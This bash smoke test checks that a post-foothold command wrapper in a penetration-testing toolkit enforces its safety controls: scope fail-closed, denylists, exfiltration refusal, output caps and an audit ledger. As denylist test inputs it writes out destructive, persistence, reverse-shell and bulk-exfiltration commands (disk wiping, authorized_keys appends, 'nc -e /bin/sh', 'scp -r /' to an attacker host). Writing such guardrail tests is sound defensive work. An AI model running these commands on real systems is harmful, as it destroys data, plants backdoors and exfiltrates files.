#!/usr/bin/env bash
# Offline proof that leash-foothold.sh enforces its post-foothold safety controls (P4): fail-closed
# without leash.env, the destructive/persistence denylist, the file-vs-command distinction for passwd,
# the bulk-copy/mass-exfil refusal, the loot byte cap, and the before-run ledger. No target traffic —
# every command runs in self-test mode (host-pin skipped) against harmless local commands. Run:
#   tools/smoke-foothold.sh
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TDIR="$(mktemp -d)"; NOENV="$(mktemp -d)"; trap 'rm -rf "$TDIR" "$NOENV"' EXIT
mkdir -p "$TDIR/raw" "$NOENV/raw"
export LEASH_FOOTHOLD_SELFTEST=1
FAIL=0
LEDGER="$TDIR/raw/foothold-ledger.jsonl"
# run quietly, return rc (stdin from /dev/null so an exec'd probe can never block on input)
LFq() { bash "$ROOT/tools/leash-foothold.sh" "$@" </dev/null >/dev/null 2>&1; }
# run and capture combined output
LFo() { bash "$ROOT/tools/leash-foothold.sh" "$@" </dev/null 2>&1; }

cat > "$TDIR/leash.env" <<'EOF'
LEASH_SCOPE=127.0.0.1
EOF

echo "1) fail-closed when leash.env is missing (expect rc=2)"
LFq "$NOENV" 127.0.0.1 id; RC=$?
echo "   rc=$RC"; [ "$RC" -eq 2 ] || { echo "   FAIL: not fail-closed on missing leash.env"; FAIL=1; }

echo "2) a benign read passes (echo; expect rc=0 and output present)"
OUT="$(LFo "$TDIR" 127.0.0.1 echo spider-ok)"; RC=$?
echo "   rc=$RC out='$OUT'"
{ [ "$RC" -eq 0 ] && printf '%s' "$OUT" | grep -q 'spider-ok'; } || { echo "   FAIL: benign command blocked"; FAIL=1; }

echo "3) reading /etc/passwd (the FILE) passes (expect rc=0)"
LFq "$TDIR" 127.0.0.1 cat /etc/passwd; RC=$?   # file may/not exist; denylist must not refuse it (rc!=5)
echo "   rc=$RC (must NOT be 5)"; [ "$RC" -ne 5 ] || { echo "   FAIL: cat /etc/passwd wrongly denied"; FAIL=1; }

echo "4) the passwd COMMAND (credential set) is refused as persistence (expect rc=8; default LEASH_FOOTHOLD_ALLOW_PERSISTENCE=0)"
LFq "$TDIR" 127.0.0.1 passwd root; RC=$?
echo "   rc=$RC"; [ "$RC" -eq 8 ] || { echo "   FAIL: passwd command not denied"; FAIL=1; }

echo "5) destructive verbs are refused (expect rc=5 each)"
for c in "rm -rf /tmp/x" "dd if=/dev/zero of=/dev/sda" "chmod -R 777 /etc" "systemctl stop sshd" "modprobe evil"; do
  LFq "$TDIR" 127.0.0.1 $c; RC=$?
  echo "   [$c] rc=$RC"; [ "$RC" -eq 5 ] || { echo "   FAIL: '$c' not denied"; FAIL=1; }
done

echo "5b) persistence verbs are refused by default (expect rc=8 each; LEASH_FOOTHOLD_ALLOW_PERSISTENCE=0)"
for c in "useradd evil" "groupadd evil" "usermod -aG sudo evil"; do
  LFq "$TDIR" 127.0.0.1 $c; RC=$?
  echo "   [$c] rc=$RC"; [ "$RC" -eq 8 ] || { echo "   FAIL: '$c' not denied as persistence"; FAIL=1; }
done

echo "6) persistence/implant + reverse-shell patterns are refused"
# authorized_keys append = persistence group (rc=8, default-off); crontab -r / nc -e = destructive (rc=5)
# quote the >>/authorized_keys one as a single arg so the smoke's own shell doesn't redirect
LFq "$TDIR" 127.0.0.1 "echo k >> /root/.ssh/authorized_keys"; RC=$?
echo "   [authorized_keys append] rc=$RC (expect 8)"; [ "$RC" -eq 8 ] || { echo "   FAIL: authorized_keys append not denied"; FAIL=1; }
LFq "$TDIR" 127.0.0.1 crontab -r; RC=$?
echo "   [crontab -r] rc=$RC (expect 5)"; [ "$RC" -eq 5 ] || { echo "   FAIL: crontab -r not denied"; FAIL=1; }
LFq "$TDIR" 127.0.0.1 nc -e /bin/sh 10.0.0.1 4444; RC=$?
echo "   [nc -e] rc=$RC (expect 5)"; [ "$RC" -eq 5 ] || { echo "   FAIL: nc -e not denied"; FAIL=1; }

echo "7) bulk-copy / mass-exfil is refused (expect rc=6 each)"
for c in "tar -czf /tmp/a.tgz /etc" "scp -r / evil@10.0.0.1:/" "rsync -a / /mnt" "zip -r out.zip /home"; do
  LFq "$TDIR" 127.0.0.1 $c; RC=$?
  echo "   [$c] rc=$RC"; [ "$RC" -eq 6 ] || { echo "   FAIL: '$c' not denied as bulk-copy"; FAIL=1; }
done

echo "8) read-only enumeration one-liners pass the denylist (must NOT be 5/6; paths scoped to /tmp so the"
echo "   self-test can't actually traverse this box — the point is the denylist verdict, not the output)"
for c in "id" "uname -a" "sudo -l" "getcap -r /tmp" "crontab -l" "find /tmp -maxdepth 1 -perm -4000 -type f"; do
  LFq "$TDIR" 127.0.0.1 $c; RC=$?
  echo "   [$c] rc=$RC"; { [ "$RC" -ne 5 ] && [ "$RC" -ne 6 ]; } || { echo "   FAIL: '$c' wrongly denied"; FAIL=1; }
done

echo "9) the loot byte cap truncates oversize output (tiny cap; expect truncation marker)"
OUT="$(LEASH_FOOTHOLD_MAX_LOOT_BYTES=8 bash "$ROOT/tools/leash-foothold.sh" "$TDIR" 127.0.0.1 echo verylongoutputbeyondcap 2>&1)"
echo "   out='$OUT'"
printf '%s' "$OUT" | grep -q 'OUTPUT TRUNCATED' || { echo "   FAIL: byte cap did not truncate"; FAIL=1; }

echo "10) the ledger recorded a run row BEFORE execution and denial rows"
grep -q '"event":"run"' "$LEDGER" || { echo "   FAIL: no run row in ledger"; FAIL=1; }
grep -q '"event":"denied"' "$LEDGER" || { echo "   FAIL: no denied row in ledger"; FAIL=1; }
echo "   ledger lines: $(wc -l < "$LEDGER" | tr -d '[:space:]')"

[ "$FAIL" -eq 0 ] && echo "SMOKE-FOOTHOLD: PASS" || { echo "SMOKE-FOOTHOLD: FAIL"; exit 1; }
